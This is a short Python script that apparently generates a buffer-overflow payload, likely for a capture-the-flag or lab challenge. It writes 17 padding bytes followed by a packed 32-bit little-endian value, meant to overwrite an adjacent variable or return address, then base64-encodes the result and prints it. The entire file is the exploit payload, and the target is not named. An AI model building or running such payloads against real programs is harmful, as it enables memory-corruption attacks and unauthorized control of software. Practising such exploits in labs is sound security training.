
import sys
import struct
import base64

buf = b'kkkkkkkkkkkkkkkkk'
buf += struct.pack('<I', 1084839226)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
